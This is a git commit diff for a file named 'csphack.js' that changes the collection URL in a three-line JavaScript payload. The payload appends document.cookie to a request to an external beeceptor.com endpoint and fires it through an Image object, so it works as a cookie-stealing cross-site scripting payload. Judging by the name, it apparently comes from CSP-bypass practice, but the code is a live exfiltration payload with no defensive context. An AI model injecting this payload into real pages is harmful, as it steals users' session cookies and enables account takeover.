a4a56456c9604c27d9487cb0c842015363a5cd7c
ainsleyhargis <44291553+ainsleyhargis@users.noreply.github.com>
2020-02-09 08:20:57 -0600

    Update csphack.js

--- csphack.js
+++ csphack.js
@@ -1,3 +1,3 @@
-var c = "https://nevernote.free.beeceptor.com/my/api/path/?c=" + document.cookie;
+var c = "https://csphack.free.beeceptor.com/my/api/path/?c=" + document.cookie;
 var img = new Image();
 img.src = c;
